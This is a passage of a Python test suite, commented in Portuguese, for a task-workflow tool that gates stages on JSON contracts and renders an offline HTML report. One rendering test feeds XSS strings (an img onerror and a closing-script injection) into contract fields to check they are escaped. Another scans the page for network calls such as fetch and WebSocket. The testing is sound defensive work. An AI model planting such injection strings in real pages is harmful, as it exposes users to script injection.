        de_outra = json.loads(alvo.read_text(encoding="utf-8"))
        de_outra["confirmado_pelo_usuario"] = True
        de_outra["tarefa_id"] = "outra-tarefa-2026-01-01"
        alvo.write_text(json.dumps(de_outra, ensure_ascii=False), encoding="utf-8")
        self.assertIn("tarefa_id", self._reprova(avancar_etapa, pasta, "objetivo-confirmado",
                                                 data=self.DATA))

    def test_direcao_escolhida_exige_decisao_tomada(self):
        pasta = self._cria()
        self._grava_contrato(pasta, "contratos/01-objetivo.json", "objetivo.json")
        avancar_etapa(pasta, "objetivo-confirmado", data=self.DATA)
        self._grava_contrato(pasta, "contratos/02-pesquisa.json", "pesquisa.json")
        avancar_etapa(pasta, "pesquisa-concluida", data=self.DATA)
        # o relatório que originou a decisão: desde a decisão 20 ele precisa estar na
        # pasta, senão não há contra o que conferir o carimbo da resposta
        self._grava_contrato(pasta, "contratos/03-direcoes.json", "direcoes.json")
        self._grava_contrato(pasta, "respostas/decisao-direcoes.json", "decisao-direcoes.json",
                             {"estado": "pendente", "direcao_escolhida": None})
        self.assertIn("pendente", self._reprova(avancar_etapa, pasta, "direcao-escolhida",
                                                data=self.DATA))
        self._grava_contrato(pasta, "respostas/decisao-direcoes.json", "decisao-direcoes.json")
        avancar_etapa(pasta, "direcao-escolhida", data=self.DATA)
        self.assertEqual(carregar_tarefa(pasta)["etapa"], "direcao-escolhida")

    def test_jornada_inteira_ate_grill_concluido(self):
        pasta = self._cria()
        passos = (("contratos/01-objetivo.json", "objetivo.json", "objetivo-confirmado"),
                  ("contratos/02-pesquisa.json", "pesquisa.json", "pesquisa-concluida"),
                  ("respostas/decisao-direcoes.json", "decisao-direcoes.json", "direcao-escolhida"),
                  ("contratos/04-grill-consolidado.json", "grill-consolidado.json",
                   "grill-concluido"))
        for destino, exemplo, etapa in passos:
            if etapa == "direcao-escolhida":     # o relatório que a decisão respondeu
                self._grava_contrato(pasta, "contratos/03-direcoes.json", "direcoes.json")
            self._grava_contrato(pasta, destino, exemplo)
            avancar_etapa(pasta, etapa, data=self.DATA)
        tarefa = carregar_e_validar(pasta / "tarefa.json")
        self.assertEqual(tarefa["etapa"], "grill-concluido")
        self.assertEqual(len(tarefa["historico"]), 5)
        self.assertIn("terminada", resumo_da_tarefa(pasta).lower())

    def test_cli_dos_tres_subcomandos(self):
        parser = construir_parser()
        self.assertIs(parser.parse_args(["nova-tarefa", "x"]).func, cmd_nova_tarefa)
        self.assertIs(parser.parse_args(["status"]).func, cmd_status)
        self.assertIs(parser.parse_args(["concluir-etapa", "p", "e"]).func, cmd_concluir_etapa)
        saida = io.StringIO()
        with contextlib.redirect_stdout(saida):
            main(["nova-tarefa", self.OBJETIVO, "--data", self.DATA, "--raiz", str(self.raiz)])
            main(["status", "--raiz", str(self.raiz)])
        self.assertIn("criada", saida.getvalue())
        pasta = pasta_de_tarefas(self.raiz) / "lancar-apartamentos-do-stay-pelo-chat-2026-08-20"
        self._grava_contrato(pasta, "contratos/01-objetivo.json", "objetivo.json")
        with contextlib.redirect_stdout(io.StringIO()):
            main(["concluir-etapa", str(pasta), "objetivo-confirmado", "--data", self.DATA])
        self.assertEqual(carregar_tarefa(pasta)["etapa"], "objetivo-confirmado")

    def test_status_sem_tarefa_e_com_varias(self):
        self._reprova(main, ["status", "--raiz", str(self.raiz)])       # nenhuma tarefa ainda
        self._cria()
        self._cria("Outro objetivo qualquer")
        saida = self._reprova(main, ["status", "--raiz", str(self.raiz)])
        self.assertIn("lancar-apartamentos-do-stay-pelo-chat-2026-08-20", saida)  # lista as opções

class TestTarefaFailClosed(unittest.TestCase):
    """Disposição da rodada 1 da Task 4: adulteração do registro, pasta corrompida,
    divergência entre `status` e o gate, leitura frágil e criação que deixa lixo."""

    DATA = "2026-08-20"

    def setUp(self):
        self._temp = tempfile.TemporaryDirectory()
        self.raiz = Path(self._temp.name)
        self.addCleanup(self._temp.cleanup)
        self.pasta = criar_tarefa(self.raiz, "Lançar apartamentos do Stay pelo chat", self.DATA)

    def _grava(self, destino, exemplo, ajustes=None):
        dado = json.loads((PASTA_DE_EXEMPLOS / "validos" / exemplo).read_text(encoding="utf-8"))
        dado["tarefa_id"] = self.pasta.name
        dado.update(ajustes or {})
        if "contrato_sha256" not in (ajustes or {}):
            carimbar_resposta_de_teste(dado, self.pasta)
        alvo = self.pasta / destino
        alvo.parent.mkdir(parents=True, exist_ok=True)
        alvo.write_text(json.dumps(dado, ensure_ascii=False, indent=2), encoding="utf-8")
        return alvo

    def _escreve_registro(self, **ajustes):
        registro = json.loads((self.pasta / "tarefa.json").read_text(encoding="utf-8"))
        registro.update(ajustes)
        (self.pasta / "tarefa.json").write_text(json.dumps(registro, ensure_ascii=False, indent=2),
                                                encoding="utf-8")
        return registro

    def _reprova(self, funcao, *args, **kwargs):
        saida = io.StringIO()
        with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit) as ctx:
            funcao(*args, **kwargs)
        self.assertEqual(ctx.exception.code, 1)
        self.assertNotIn("Traceback", saida.getvalue())
        self.assertEqual(achar_ingles(prosa_sem_detalhe_tecnico(sem_citacoes(
            saida.getvalue()))), [], saida.getvalue())
        return saida.getvalue()

    def _passo(self, etapa, quando=None):
        return {"etapa": etapa, "em": quando or f"{self.DATA}T00:00:00", "por": "adulterador",
                "contrato": GATE_DA_ETAPA[etapa][0]}

    def test_registro_adulterado_reprova(self):                              # r1/P1-1
        criada = {"etapa": "criada", "em": f"{self.DATA}T00:00:00", "por": "temcomo (motor)"}
        casos = {
            "etapa adiantada sem histórico": {"etapa": "objetivo-confirmado"},
            "jornada terminada sem histórico": {"etapa": "grill-concluido"},
            "histórico que pula etapa": {"etapa": "pesquisa-concluida",
                                         "historico": [criada, self._passo("pesquisa-concluida")]},
            "histórico fora de ordem": {
                "etapa": "pesquisa-concluida",
                "historico": [criada, self._passo("pesquisa-concluida"),
                              self._passo("objetivo-confirmado")]},
            "etapa repetida": {"etapa": "objetivo-confirmado",
                               "historico": [criada, self._passo("objetivo-confirmado"),
                                             self._passo("objetivo-confirmado")]},
            "último passo diferente da etapa": {
                "etapa": "criada", "historico": [criada, self._passo("objetivo-confirmado")]},
            "não começa em criada": {"etapa": "objetivo-confirmado",
                                     "historico": [self._passo("objetivo-confirmado")]},
            "avanço sem contrato citado": {
                "etapa": "objetivo-confirmado",
                "historico": [criada, {"etapa": "objetivo-confirmado",
                                       "em": f"{self.DATA}T00:00:00", "por": "adulterador"}]},
        }
        for pista, ajustes in casos.items():
            self._escreve_registro(**ajustes)
            self._reprova(carregar_tarefa, self.pasta)                 # leitura reprova
            self._reprova(main, ["validar", str(self.pasta / "tarefa.json")])   # e o CLI também

    def test_contrato_citado_no_historico_precisa_existir_e_valer(self):     # r1/P1-1
        criada = {"etapa": "criada", "em": f"{self.DATA}T00:00:00", "por": "temcomo (motor)"}
        self._escreve_registro(etapa="objetivo-confirmado",
                               historico=[criada, self._passo("objetivo-confirmado")])
        saida = self._reprova(carregar_tarefa, self.pasta)             # arquivo nem existe
        self.assertIn("01-objetivo.json", saida)
        alvo = self._grava("contratos/01-objetivo.json", "objetivo.json",
                           {"confirmado_pelo_usuario": False})
        self._reprova(carregar_tarefa, self.pasta)                     # existe, mas é inválido
        alvo.write_text(json.dumps(json.loads(
            (PASTA_DE_EXEMPLOS / "validos" / "objetivo.json").read_text(encoding="utf-8"))
            | {"tarefa_id": self.pasta.name}, ensure_ascii=False), encoding="utf-8")
        self.assertEqual(carregar_tarefa(self.pasta)["etapa"], "objetivo-confirmado")

    def test_pasta_estruturalmente_incompleta_reprova(self):                 # r1/P1-2
        self._grava("contratos/01-objetivo.json", "objetivo.json")
        for sub in SUBPASTAS_DA_TAREFA:
            alvo = self.pasta / sub
            guardado = sorted(alvo.iterdir())
            conteudo = {p.name: p.read_bytes() for p in guardado}
            for p in guardado:
                p.unlink()
            alvo.rmdir()
            self.assertIn(sub, self._reprova(carregar_tarefa, self.pasta))
            self._reprova(avancar_etapa, self.pasta, "objetivo-confirmado", data=self.DATA)
            alvo.write_bytes(b"nao sou pasta")                          # e se virar arquivo?
            self.assertIn(sub, self._reprova(carregar_tarefa, self.pasta))
            alvo.unlink()
            alvo.mkdir()
            for nome, bytes_ in conteudo.items():
                (alvo / nome).write_bytes(bytes_)
        self.assertEqual(carregar_tarefa(self.pasta)["etapa"], "criada")

    def test_status_nunca_diverge_do_gate(self):                             # r1/P1-3
        alvo = self.pasta / "contratos/01-objetivo.json"
        cenarios = (
            ("arquivo ausente", lambda: None),
            ("JSON quebrado", lambda: alvo.write_text("{", encoding="utf-8")),
            ("contrato de outra etapa", lambda: self._grava("contratos/01-objetivo.json",
                                                           "pesquisa.json")),
            ("tarefa de outra pessoa", lambda: self._grava("contratos/01-objetivo.json",
                                                           "objetivo.json",
                                                           {"tarefa_id": "outra-2026-01-01"})),
            ("contrato inválido", lambda: self._grava("contratos/01-objetivo.json",
                                                      "objetivo.json",
                                                      {"confirmado_pelo_usuario": False})),
        )
        for pista, preparar in cenarios:
            preparar()
            texto = resumo_da_tarefa(self.pasta)
            self.assertNotIn("pronto para concluir", texto, pista)
            self.assertIn("objetivo-confirmado", texto)
            self._reprova(avancar_etapa, self.pasta, "objetivo-confirmado", data=self.DATA)
            self.assertEqual(achar_ingles(sem_citacoes(texto)), [], texto)
        self._grava("contratos/01-objetivo.json", "objetivo.json")
        self.assertIn("pronto para concluir", resumo_da_tarefa(self.pasta))

    def test_status_e_gate_concordam_na_decisao_pendente(self):              # r1/P1-3
        self._grava("contratos/01-objetivo.json", "objetivo.json")
        avancar_etapa(self.pasta, "objetivo-confirmado", data=self.DATA)
        self._grava("contratos/02-pesquisa.json", "pesquisa.json")
        avancar_etapa(self.pasta, "pesquisa-concluida", data=self.DATA)
        self._grava("respostas/decisao-direcoes.json", "decisao-direcoes.json",
                    {"estado": "pendente", "direcao_escolhida": None})
        texto = resumo_da_tarefa(self.pasta)
        self.assertNotIn("pronto para concluir", texto)
        self.assertIn("pendente", texto)
        self._reprova(avancar_etapa, self.pasta, "direcao-escolhida", data=self.DATA)

    def test_leitura_nao_vaza_traceback_com_numero_gigante(self):            # r1/P1-4
        alvo = self.pasta / "contratos/01-objetivo.json"
        alvo.write_text('{"schema_version": "objetivo-v1", "n": ' + "9" * 5000 + "}",
                        encoding="utf-8")
        saida = io.StringIO()
        with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit):
            carregar_e_validar(alvo)          # em 3.9 reprova por contrato; em 3.11+ pelo decoder
        self.assertNotIn("Traceback", saida.getvalue())
        with mock.patch.object(json, "loads",
                               side_effect=ValueError("Exceeds the limit (4300 digits)")):
            saida = self._reprova(ler_json, alvo)        # o tratamento existe em toda versão
        self.assertIn("número", saida.lower())

    def test_criacao_recusada_nao_deixa_lixo(self):                          # r1/P1-5
        antes = sorted(p.name for p in pasta_de_tarefas(self.raiz).iterdir())
        invisivel = chr(0x200B)
        casos = ({"produzido_por": {"agente": "x", "modelo": invisivel,
                                    "sessao_id": "s", "transcript_jsonl": "t"}},
                 {"objetivo": invisivel * 300 + "X"},
                 {"objetivo": "   "})
        for ajustes in casos:
            objetivo = ajustes.pop("objetivo", "Tarefa que vai ser recusada")
            self._reprova(criar_tarefa, self.raiz, objetivo, self.DATA,
                          ajustes.get("produzido_por"))
            self.assertEqual(sorted(p.name for p in pasta_de_tarefas(self.raiz).iterdir()), antes,
                             "sobrou lixo de uma criação recusada")
        pasta = criar_tarefa(self.raiz, "Tarefa que vai ser recusada", self.DATA)
        self.assertTrue((pasta / "tarefa.json").exists())      # a correção não fica bloqueada

    def test_status_so_anuncia_pronta_a_proxima_etapa(self):                 # r2/P1
        """Com TODOS os contratos no lugar, ainda assim só a próxima etapa pode
        aparecer como pronta: as posteriores aguardam as anteriores, e o `status`
        precisa dizer exatamente o que o `concluir-etapa` faria."""
        contratos = (("contratos/01-objetivo.json", "objetivo.json", "objetivo-confirmado"),
                     ("contratos/02-pesquisa.json", "pesquisa.json", "pesquisa-concluida"),
                     ("respostas/decisao-direcoes.json", "decisao-direcoes.json",
                      "direcao-escolhida"),
                     ("contratos/04-grill-consolidado.json", "grill-consolidado.json",
                      "grill-concluido"))
        # o relatório de direções entra primeiro: a decisão é conferida contra ele desde
        # a decisão 20, então "todos os contratos no lugar" agora o inclui
        self._grava("contratos/03-direcoes.json", "direcoes.json")
        for destino, exemplo, _ in contratos:
            self._grava(destino, exemplo)
        for i, (_, _, etapa_alvo) in enumerate(contratos):
            registro = carregar_tarefa(self.pasta)
            futuras = ETAPAS[ETAPAS.index(registro["etapa"]) + 1:]
            texto = resumo_da_tarefa(self.pasta)
            for posicao, etapa in enumerate(futuras):
                trecho = texto.split(f"• {etapa} —")[1].split("•")[0]
                if posicao == 0:                       # a próxima: pronta e concluível
                    self.assertIn("pronto para concluir", trecho, etapa)
                else:                                  # as posteriores: aguardam
                    self.assertNotIn("pronto para concluir", trecho, etapa)
                    self.assertIn("aguarda", trecho, etapa)
                    self.assertIn(futuras[0], trecho, etapa)   # nomeia o que falta antes
                    self._reprova(avancar_etapa, self.pasta, etapa, data=self.DATA)
            avancar_etapa(self.pasta, etapa_alvo, data=self.DATA)
        self.assertEqual(carregar_tarefa(self.pasta)["etapa"], "grill-concluido")

    def test_gate_de_etapa_ja_concluida_nao_diz_pronto(self):                # r2/P1
        self._grava("contratos/01-objetivo.json", "objetivo.json")
        avancar_etapa(self.pasta, "objetivo-confirmado", data=self.DATA)
        registro = carregar_tarefa(self.pasta)
        for etapa in ("criada", "objetivo-confirmado"):
            satisfeito, motivo = avaliar_gate(self.pasta, etapa, registro)
            self.assertFalse(satisfeito, etapa)
            self.assertIn("já", motivo)

    def test_erro_do_sistema_sai_em_portugues(self):                        # r2/P2
        conhecidos = {errno.EACCES: "permissão", errno.ENOSPC: "espaço",
                      errno.EROFS: "leitura", errno.ENOTDIR: "pasta"}
        for codigo, palavra in conhecidos.items():
            motivo = motivo_do_sistema(OSError(codigo, "Permission denied"))
            self.assertIn(palavra, motivo)
            self.assertNotIn(ROTULO_SISTEMA, motivo)
            self.assertEqual(achar_ingles(motivo), [], motivo)
        exotico = motivo_do_sistema(OSError(9999, "Some exotic failure"))
        self.assertIn(ROTULO_SISTEMA, exotico)                  # padrão da decisão 15
        self.assertIn("Some exotic failure", exotico)           # detalhe preservado
        self.assertEqual(achar_ingles(prosa_sem_detalhe_tecnico(exotico)), [], exotico)

    def test_pasta_sem_permissao_de_escrita_reprova_em_portugues(self):     # r2/P2
        travada = self.raiz / "travada"
        travada.mkdir()
        (travada / ".temcomo" / "tarefas").mkdir(parents=True)
        os.chmod(travada / ".temcomo" / "tarefas", 0o500)
        self.addCleanup(os.chmod, travada / ".temcomo" / "tarefas", 0o700)
        if os.access(travada / ".temcomo" / "tarefas", os.W_OK):
            self.skipTest("o processo escreve mesmo sem permissão (root)")
        saida = self._reprova(criar_tarefa, travada, "Objetivo qualquer", self.DATA)
        self.assertIn("permissão", saida)
        self.assertFalse(list((travada / ".temcomo" / "tarefas").iterdir()), "sobrou lixo")

    @staticmethod
    def _escrita_que_falha(codigo, texto_do_sistema, parcial=False):
        """Simula o disco falhando no meio da escrita (a mais perigosa das falhas:
        o arquivo já foi truncado quando o erro chega)."""
        original = Path.write_text

        def falsa(caminho, texto, *args, **kwargs):
            if parcial:
                original(caminho, texto[:1], encoding="utf-8")
            raise OSError(codigo, texto_do_sistema)
        return mock.patch.object(Path, "write_text", falsa)

    def test_escrita_parcial_nao_destroi_o_registro(self):                   # r3/1
        self._grava("contratos/01-objetivo.json", "objetivo.json")
        antes = (self.pasta / "tarefa.json").read_bytes()
        with self._escrita_que_falha(errno.ENOSPC, "No space left on device", parcial=True):
            saida = self._reprova(avancar_etapa, self.pasta, "objetivo-confirmado",
                                  data=self.DATA)
        self.assertIn("espaço", saida)
        self.assertEqual((self.pasta / "tarefa.json").read_bytes(), antes,
                         "o registro que já existia foi destruído")
        self.assertIn("criada", resumo_da_tarefa(self.pasta))     # a tarefa segue utilizável
        self.assertEqual(sorted(p.name for p in self.pasta.iterdir()),
                         ["contratos", "html", "pesquisas", "respostas", "tarefa.json"],
                         "sobrou arquivo temporário na pasta da tarefa")

    def test_falha_ao_gravar_nao_deixa_rascunho(self):                       # r3/3
        antes = sorted(p.name for p in pasta_de_tarefas(self.raiz).iterdir())
        with self._escrita_que_falha(errno.EACCES, "Permission denied"):
            self._reprova(criar_tarefa, self.raiz, "Tarefa que falha ao gravar", self.DATA)
        self.assertEqual(sorted(p.name for p in pasta_de_tarefas(self.raiz).iterdir()), antes,
                         "sobrou rascunho '.parcial-*' de uma criação que falhou")

    def test_caminho_comprido_demais_reprova_em_portugues(self):             # r3/2
        longo = self.raiz / ("n" * 300)
        try:
            longo.exists()
        except OSError:
            pass
        else:
            self.skipTest("este sistema de arquivos aceita nome de 300 caracteres")
        for argv in (["nova-tarefa", "Objetivo", "--data", self.DATA, "--raiz", str(longo)],
                     ["status", "--raiz", str(longo)],
                     ["status", str(longo)],
                     ["concluir-etapa", str(longo), "objetivo-confirmado", "--data", self.DATA]):
            saida = self._reprova(main, argv)
            self.assertIn("comprido demais", saida, argv[0])

    def test_data_impossivel_reprova(self):                                  # r1/P2-6
        for data in ("2026-02-31", "2026-13-01", "2026-00-10", "2026-04-31"):
            self.assertIn("data", self._reprova(agora_iso, data).lower())
        self.assertEqual(agora_iso("2026-02-28"), "2026-02-28T00:00:00")
        self.assertEqual(agora_iso("2024-02-29"), "2024-02-29T00:00:00")     # bissexto vale

    def test_raiz_invalida_reprova(self):                                    # r1/P2-7
        arquivo = self.raiz / "nao-sou-pasta.txt"
        arquivo.write_text("oi", encoding="utf-8")
        self._reprova(criar_tarefa, arquivo, "Objetivo qualquer", self.DATA)
        self._reprova(main, ["nova-tarefa", "Objetivo qualquer", "--data", self.DATA,
                             "--raiz", str(arquivo)])
        self._reprova(main, ["status", "--raiz", str(arquivo)])

class TestRenderDirecoes(unittest.TestCase):
    """Task 5: o HTML de direções nasce do template aprovado, com a identidade
    QualiApps byte-preservada e sem nada vindo da rede."""

    @classmethod
    def setUpClass(cls):
        cls.contrato = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                                  .read_text(encoding="utf-8"))
        cls.html = render_direcoes(cls.contrato)

    @staticmethod
    def _bloco_root(texto):
        inicio = texto.index(":root {")
        return texto[inicio:texto.index("\n}", inicio) + 2]

    def test_tokens_byte_identicos_ao_prototipo(self):                      # (a)
        dos_assets = (PASTA_DE_ASSETS / "tokens.css").read_text(encoding="utf-8")
        self.assertEqual(self._bloco_root(self.html), self._bloco_root(dos_assets))
        prototipo = RAIZ_DO_PLUGIN / "Prototypes" / "01-relatorio-direcoes.html"
        if prototipo.exists():        # contrato visual aprovado (decisão 11)
            self.assertEqual(self._bloco_root(self.html),
                             self._bloco_root(prototipo.read_text(encoding="utf-8")))

    def test_oito_font_face_iguais_aos_do_prototipo(self):                  # (b)
        fontes_html = re.findall(r"@font-face\s*\{[^}]*\}", self.html)
        self.assertEqual(len(fontes_html), 8, "a identidade tipográfica mudou")
        fontes_asset = re.findall(r"@font-face\s*\{[^}]*\}",
                                  (PASTA_DE_ASSETS / "fontes.css").read_text(encoding="utf-8"))
        self.assertEqual(fontes_html, fontes_asset)
        prototipo = RAIZ_DO_PLUGIN / "Prototypes" / "01-relatorio-direcoes.html"
        if prototipo.exists():
            self.assertEqual(fontes_html, re.findall(r"@font-face\s*\{[^}]*\}",
                                                     prototipo.read_text(encoding="utf-8")))

    def test_offline_de_verdade(self):                                      # (c)
        externos = [m for m in re.findall(r'(?:src|href)\s*=\s*"([^"]*)"', self.html)
                    if m.startswith(("http:", "https:", "//"))]
        self.assertEqual(externos, [], "a página busca coisa na rede")
        for suspeito in ("fonts.googleapis", "fetch(", "XMLHttpRequest", "WebSocket",
                         "importScripts"):
            self.assertFalse(suspeito in self.html, f"a página pode ir à rede: {suspeito}")

    def test_comentario_de_proveniencia_com_sha_do_contrato(self):          # (d)
        sha = sha_do_contrato(self.contrato)
        self.assertTrue(f"<!-- temcomo engine v{ENGINE_VERSION} · contrato sha256 {sha} -->"
                        in self.html, "falta o comentário de proveniência")
        self.assertEqual(len(sha), 64)

    def test_determinismo_do_render(self):                                  # (e)
        self.assertTrue(render_direcoes(self.contrato) == self.html, "render 2× divergiu")
        outra = render_direcoes(json.loads(json.dumps(self.contrato)))
        self.assertTrue(outra == self.html, "cópia do contrato deu bytes diferentes")

    def test_faixa_de_exemplo_so_com_exemplo_verdadeiro(self):
        self.assertTrue("PROTÓTIPO" in self.html)      # o exemplo tem exemplo: true
        real = json.loads(json.dumps(self.contrato))
        real.pop("exemplo", None)
        real.pop("prototipo", None)
        sem_faixa = render_direcoes(real)
        self.assertFalse("PROTÓTIPO" in sem_faixa, "faixa de exemplo em contrato real")
        self.assertFalse("dados de exemplo" in sem_faixa)

    def test_conteudo_do_contrato_esta_no_documento(self):
        def presente(trecho, pista):
            self.assertTrue(trecho in self.html, f"faltou na página: {pista}")
        presente(html.escape(self.contrato["pergunta_original"]), "pergunta original")
        presente(html.escape(self.contrato["objetivo_leigo"]), "objetivo leigo")
        for direcao in self.contrato["direcoes"]:
            presente(html.escape(direcao["nome"]), f"nome de {direcao['id']}")
            presente(f'data-dir-id="{direcao["id"]}"', f"âncora de {direcao['id']}")
        presente(self.contrato["tarefa_id"], "identificador da tarefa")

    def test_dado_do_contrato_nao_injeta_html(self):
        veneno = json.loads(json.dumps(self.contrato))
        veneno["direcoes"][0]["nome"] = '<img src=x onerror="alert(1)">'
        veneno["objetivo_leigo"] = "</script><script>alert(2)</script>"
        saida = render_direcoes(veneno)
        # o dado embutido em <script type="application/json"> é inerte; o perigo é (a) ele
        # conseguir fechar a tag e (b) o markup renderizado receber o dado sem escapar.
        abertura = '<script type="application/json" id="contrato-json">'
        inicio = saida.index(abertura) + len(abertura)
        json_embutido = saida[inicio:saida.index("</script>", inicio)]
        markup = saida[:inicio] + saida[saida.index("</script>", inicio):]
        self.assertFalse("</script" in json_embutido.lower(), "o dado consegue fechar a tag")
        self.assertEqual(json.loads(json_embutido)["objetivo_leigo"], veneno["objetivo_leigo"],
                         "o escape estragou o dado")
        self.assertFalse("<img src=x onerror" in markup, "dado do contrato virou markup")
        self.assertFalse("<script>alert(2)" in markup, "dado do contrato virou script")
        self.assertTrue("&lt;img src=x" in markup)

    def test_export_do_navegador_declara_quem_preencheu(self):
        # pendência registrada na Task 3: o export precisa do envelope de autoria
        self.assertTrue('produzido_por: { agente: "usuario" }' in self.html,
                        "o export do navegador não declara quem preencheu")

    def test_chave_de_rascunho_tem_namespace_do_temcomo(self):
        chave = f"temcomo:{self.contrato['tarefa_id']}:decisao-direcoes"
        self.assertTrue(chave in self.html, f"faltou a chave de rascunho {chave!r}")
        self.assertTrue("chave_localstorage" in self.html)   # nome unificado (Task 3)
        self.assertFalse("storage_key" in self.html, "voltou o nome divergente do grill")

    def test_anotacao_incompleta_trava_o_export(self):       # decisão 17
        for marca in ("(trecho não recuperado do rascunho)", '"orfa"', "anotacoes-incompletas",
                      "Manter a anotação", "Jogar fora", "TRECHO_NAO_RECUPERADO",
                      "anotacoesPendentes", "nada é jogado fora sem você mandar"):
            self.assertTrue(marca in self.html, f"decisão 17: faltou {marca!r} na página")
        self.assertTrue("data-descartar" in self.html and "data-manter" in self.html)

class TestRenderSemResiduo(unittest.TestCase):
    """Disposição da rodada 1 da Task 5: a página não pode contar a história da
    semente para o contrato de outra pessoa, nem quebrar com dado válido."""

    @classmethod
    def setUpClass(cls):
        cls.neutro = {
            "schema_version": "direcoes-v1",
            "tarefa_id": "escolher-torrador-de-cafe-2026-08-21",
            "gerado_em": "2026-08-21T09:00:00-03:00",
            "produzido_por": {"agente": "teste", "modelo": "teste",
                              "sessao_id": "teste", "transcript_jsonl": "teste"},
            "pergunta_original": "Tem como torrar café em casa com qualidade de cafeteria?",
            "objetivo_leigo": "Torrar grão verde em casa e chegar num café tão bom quanto o "
                              "da cafeteria da esquina, sem virar um segundo emprego.",
            "etapa": {"numero": 7, "total": 9, "nome": "Escolher o torrador"},
            "criterios": [{"id": "agentica", "nome": "Integração agêntica",
                           "pergunta_leiga": "A IA consegue operar isso sozinha depois?",
                           "peso": "alto", "sempre_presente": True}],
            "direcoes": [{"id": "torrador-tambor", "letra": "B",
                          "nome": "Torrador de tambor de bancada", "recomendada": True,
                          "fora_da_caixa": False, "origem": "reuso",
                          "origem_leiga": "Comprar pronto", "custo": "médio",
                          "custo_leigo": "Uma diária de trabalho", "custo_curto": "1 dia",
                          "complexidade": "média", "aderencia": 88,
                          "limite_principal": "Torra pouco por vez.",
                          "explicacao_leiga": "Um tambor que gira sobre a chama e torra o "
                                              "grão por igual, do jeito que a cafeteria faz.",
                          "resumo": "O jeito clássico, em escala de casa.",
                          "pontuacao": {"agentica": 4},
                          "consequencias": {"prazo": "duas semanas", "primeiro_passo": "medir a bancada",
                                            "ganha": ["café fresco todo dia"],
                                            "aceita_perder": ["espaço na bancada"],
                                            "vs_recomendada": "É o recomendado."}}],
            "recomendacao": {"direcao_id": "torrador-tambor",
                             "justificativa": "Entrega o resultado com o menor risco."},
        }
        cls.html = render_direcoes(cls.neutro)

    @staticmethod
    def _sem_ativos(pagina):
        """Sem os `data:` base64: 1,3 MB de fonte contém qualquer sequência curta por
        acaso — foi o que fez 'stay' aparecer como falso positivo na rodada 1."""
        return re.sub(r"data:[a-z/]+;base64,[A-Za-z0-9+/=]+", "«ativo»", pagina)

    @classmethod
    def _prosa(cls, pagina):
        """O que o usuário efetivamente lê: sem ativos, sem script e sem estilo.
        Comentário de código não é prosa da página (rodada 2: 'instante da ação do
        usuário' era um comentário no JavaScript, não uma frase na tela)."""
        visivel = re.sub(r"<script.*?</script>", " ", cls._sem_ativos(pagina), flags=re.S)
        return re.sub(r"<style.*?</style>", " ", visivel, flags=re.S)

    @staticmethod
    def _contrato_generico(tag, letra, numero, total, etapa, quantas):
        """Contrato neutro, sem nada da semente: serve para separar o que o motor
        escreve (igual nos dois) do que vem do contrato (muda)."""
        return {"schema_version": "direcoes-v1", "tarefa_id": f"tarefa-{tag}-2026-08-21",
                "gerado_em": "2026-08-21T09:00:00-03:00",
                "produzido_por": {"agente": "a", "modelo": "b", "sessao_id": "c",
                                  "transcript_jsonl": "d"},
                "pergunta_original": f"Pergunta sobre {tag}?",
                "objetivo_leigo": f"Objetivo de {tag}.",
                "etapa": {"numero": numero, "total": total, "nome": etapa},
                "criterios": [{"id": "agentica", "nome": "Integração agêntica",
                               "pergunta_leiga": f"IA cuida de {tag}?", "peso": "alto",
                               "sempre_presente": True}],
                "direcoes": [{"id": f"{tag}-{i}", "letra": letra, "nome": f"Caminho {tag} {i}",
                              "recomendada": i == 0, "fora_da_caixa": False, "origem": "reuso",
                              "origem_leiga": f"Origem {tag}", "custo": "alto",
                              "custo_leigo": f"Custo {tag}", "custo_curto": f"{i} un",
                              "complexidade": "alta", "aderencia": 70 + i,
                              "limite_principal": f"Limite {tag}.",
                              "explicacao_leiga": f"Explicação {tag}.", "resumo": f"Resumo {tag}.",
                              "pontuacao": {"agentica": 3},
                              "consequencias": {"prazo": f"Prazo {tag}",
                                                "primeiro_passo": f"Passo {tag}",
                                                "ganha": [f"Ganho {tag}"],
                                                "aceita_perder": [f"Perda {tag}"],
                                                "vs_recomendada": f"Versus {tag}."}}
                             for i in range(quantas)],
                "recomendacao": {"direcao_id": f"{tag}-0",
                                 "justificativa": f"Justificativa {tag}."}}

    @staticmethod
    def _nos_estruturais(contrato):
        """Os nós de texto que o MOTOR escreve, já sem o que veio do contrato — que
        no HTML vai marcado com <span data-origem-contrato> (receita r3/2)."""
        return prosa_estrutural(render_direcoes(contrato))

    def test_prosa_estrutural_esta_toda_no_inventario_auditado(self):       # r2/2, r3/2
        """A caça ao resíduo na direção inversa, agora pela UNIÃO: interseção deixava
        passar prosa que só aparece em alguns renders (achado r3/2). Cada nó estrutural
        precisa estar no inventário já auditado — prosa nova reprova até alguém olhar."""
        exemplo = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                             .read_text(encoding="utf-8"))
        sem_etapa = json.loads(json.dumps(self.neutro))
        del sem_etapa["etapa"]          # decisão 19: este caminho também é auditado
        uniao = set()
        for contrato in (self._contrato_generico("mural", "D", 6, 8, "Escolher método", 1),
                         self._contrato_generico("horta", "B", 2, 5, "Definir sistema", 2),
                         self._contrato_generico("cafe", "A", 1, 3, "Comparar torras", 5),
                         self.neutro, sem_etapa, exemplo):
            uniao |= self._nos_estruturais(contrato)
        inventario = self._inventario()
        novas = uniao - inventario
        self.assertEqual(novas, set(), f"prosa nova sem auditoria: {sorted(novas)[:5]}")
        self.assertGreater(len(inventario), 80, "o inventário parece truncado")
        for frase in inventario:      # o inventário também não pode envelhecer sujo
            for termo in self.RESIDUOS_CONHECIDOS:
                self.assertFalse(termo in frase, f"resíduo dentro do inventário: {frase[:60]!r}")

    @staticmethod
    def _inventario():
        return {linha.strip() for linha
                in (PASTA_DE_TEMPLATES / "prosa-estrutural-direcoes.txt")
                .read_text(encoding="utf-8").splitlines()
                if linha.strip() and not linha.startswith("#")}

    def test_o_gate_de_prosa_pega_residuo_plantado(self):                   # r3/2
        """Mutação-sentinela: prosa fixa injetada dentro de um composto que carrega dado
        variável (o rodapé, com o tarefa_id) precisa ser vista pelo gate. Era exatamente
        aí que a interseção falhava — o nó mudava de render para render e sumia."""
        original = render_direcoes
        residuo = "Todos os dados desta página são exemplo fictício"

        def render_com_residuo(contrato):
            pagina = original(contrato)
            return pagina.replace('<p class="foot-note">',
                                  f'<p class="foot-note">{residuo} ')
        try:
            globals()["render_direcoes"] = render_com_residuo
            uniao = set()
